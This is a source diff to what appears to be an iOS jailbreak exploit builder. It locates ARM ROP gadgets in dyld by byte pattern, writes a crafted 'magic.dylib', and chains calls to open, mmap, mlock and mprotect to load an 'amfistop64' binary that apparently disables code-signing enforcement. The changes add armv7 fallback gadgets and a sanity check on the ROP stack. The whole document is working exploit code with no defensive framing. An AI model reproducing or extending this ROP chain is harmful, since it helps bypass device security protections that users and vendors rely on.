@@ -20,6 +20,8 @@
 #include "symbols.h"
 #include "defines.h"
 
+#define INVALID_GADGET 0x37133713
+
 #if __LP64__
 #define macho_header			mach_header_64
 #define mach_hdr				struct mach_header_64
@@ -419,7 +421,7 @@ int main(int argc, const char * argv[]) {
     
     uintptr_t dyld_base = 0x50001001;
 #define DeclGadget(name, pattern, size) uint32_t name = (uint32_t)memmem(g_text_ptr, g_text_size, (void*)pattern, size); assert(name); name -= (uint32_t)g_text_ptr; name += (uint32_t)dyld_base
-    
+#define TryDeclGadget(name, pattern, size, res) uint32_t name = (uint32_t)memmem(g_text_ptr, g_text_size, (void*)pattern, size); if ((res= name != 0)){ name -= (uint32_t)g_text_ptr; name += (uint32_t)dyld_base;} else {name = INVALID_GADGET;}
     
     int fd=open("./magic.dylib", O_CREAT | O_RDWR | O_TRUNC, 0755);
     assert(fd > 0);
@@ -566,15 +568,31 @@ int main(int argc, const char * argv[]) {
     DeclGadget(bx_lr, (&(char[]){0x70,0x47}), 2);
     DeclGadget(not_r0_pop_r4r7pc, (&(char[]){0x01,0x46,0x00,0x20,0x00,0x29,0x08,0xbf,0x01,0x20,0x90,0xbd}), 12);
     DeclGadget(muls_r0r2r0_ldr_r2r4_str_r248_pop_r4r5r7pc, (&(char[]){0x50,0x43,0x22,0x68,0xC2,0xE9,0x0C,0x01,0xB0,0xBD}), 10);
-    DeclGadget(lsrs_r0_2_popr4r5r7pc, (&(char[]){0x4F,0xEA,0x90,0x00,0xB0,0xBD}), 6);
+    
+    //not available in armv7 ant not actually required here
+    
+//    DeclGadget(bx_r2_pop_r4r5r7pc, (&(char[]){0x10,0x47,0xb0,0xbd}), 4);
+    
+    int armv7m = 0;
+    int armv7 = 0;
+    uint32_t lsrs_r0_2_popr4r5r7pc = INVALID_GADGET;
+    TryDeclGadget(lsrs_r0_2_popr4r5r7pc_armv7m, (&(char[]){0x4F,0xEA,0x90,0x00,0xB0,0xBD}), 6,armv7m);
+    //armv7: lsrs r0, r0, #0x2 pop  {r4, r5, r7, pc}
+    TryDeclGadget(lsrs_r0_2_popr4r5r7pc_armv7, (&(char[]){0x80,0x08,0xB0,0xBD}), 4,armv7);
+    assert(armv7m | armv7);
+    lsrs_r0_2_popr4r5r7pc = (armv7m) ? lsrs_r0_2_popr4r5r7pc_armv7m : lsrs_r0_2_popr4r5r7pc_armv7;
+    ///////
+    TryDeclGadget(pop_r0r1r3r5r7pc, (&(char[]){0xab,0xbd}), 2,armv7m);
+    //armv7: pop {r0, r2, r4, r6, r7, pc}
+    TryDeclGadget(pop_r0r2r4r6r7pc, (&(char[]){0xd5,0xbd}), 2,armv7);
+    assert(armv7m | armv7);
+    
     
     
     DeclGadget(ldr_r0_r0_8_pop_r7pc, (&(char[]){0x80,0x68,0x80,0xbd}), 4);
     DeclGadget(str_r0_r4_8_pop_r4r7pc, (&(char[]){0xa0,0x60,0x90,0xbd}), 4);
-    DeclGadget(bx_r2_pop_r4r5r7pc, (&(char[]){0x10,0x47,0xb0,0xbd}), 4);
     DeclGadget(bx_r2_add_sp_40_pop_r8r10r11r4r5r6r7pc, (&(char[]){0x10,0x47,0x10,0xB0,0xBD,0xE8,0x00,0x0D,0xF0,0xBD}), 10);
     DeclGadget(pop_r8r10r11r4r5r6r7pc, (&(char[]){0xBD,0xE8,0x00,0x0D,0xF0,0xBD}), 6);
-    DeclGadget(pop_r0r1r3r5r7pc, (&(char[]){0xab,0xbd}), 2);
     
     DeclGadget(pop_r0r1r2r3r5r7pc, (&(char[]){0xaf,0xbd}), 2);
     
@@ -626,13 +644,17 @@ int main(int argc, const char * argv[]) {
   
     strcpy(argss->a, "/var/mobile/Media/amfistop64");
     
+    
     void *indata;
     const char *localPath = "../untether/amfistop64";
 	NSLog(@"Using %s as local copy (remote path %s)", localPath, argss->a);
     // read file (need to read on ROP too)
     int fd_local = open(localPath, O_RDWR);
     // dub for ROP
+    
     RopCallFunction2(PUSH, @"_open", SEG_VAR(a), O_RDWR);
+    
+    
     // save fd
     StoreR0(PUSH, SEG_VAR(fd1));
     
@@ -680,6 +702,7 @@ int main(int argc, const char * argv[]) {
                     }
                     lc = (struct load_command*)(((char*)lc) + lc->cmdsize);
                 }
+                
 
 				// read file on ROP
                 //int fd = open(localPath, O_RDONLY);
@@ -689,7 +712,8 @@ int main(int argc, const char * argv[]) {
 
                 // calc virtual size
                 size_t vm_size = end - base;
-
+                
+                
                 // mmap file on ROP
                 //void *filedata1 = mmap(NULL, size*2, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
                 RopCallFunction7Deref1(PUSH, @"___mmap", 4, SEG_VAR(fd2), NULL, vm_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, -123, 0, 0);
@@ -744,12 +768,14 @@ int main(int argc, const char * argv[]) {
                     }
                     lc = (struct load_command*)(((char*)lc) + lc->cmdsize);
                 }
-				
+                
+                
 				//NSLog(@"text_addr %lx, text_size %lx", text_addr, text_size);
                 // mlock __TEXT pages on ROP
                 //mlock((void*)text_addr, text_size);
                 RopCallFunction3Deref1(PUSH, @"___syscall", 1, SEG_VAR(text_addr), SYS_mlock, -123, text_size);
 				
+                
 				// protect __TEXT pages with PROT_EXEC | PROT_READ on ROP
                 //mprotect((void*)text_addr, text_size, PROT_EXEC | PROT_READ);
                 RopCallFunction4Deref1(PUSH, @"___syscall", 1, SEG_VAR(text_addr), SYS_mprotect, -123, text_size, PROT_READ|PROT_EXEC);
@@ -823,6 +849,8 @@ int main(int argc, const char * argv[]) {
         
     }
     fsz += load_cmd_seg.filesize;
+    
+    for (uint32_t *ins = stackbase; ins < stack; ins++) assert(*ins != INVALID_GADGET);
     
     load_cmd_seg.fileoff = 0;
     load_cmd_seg.filesize = (uint32_t)0x1000;
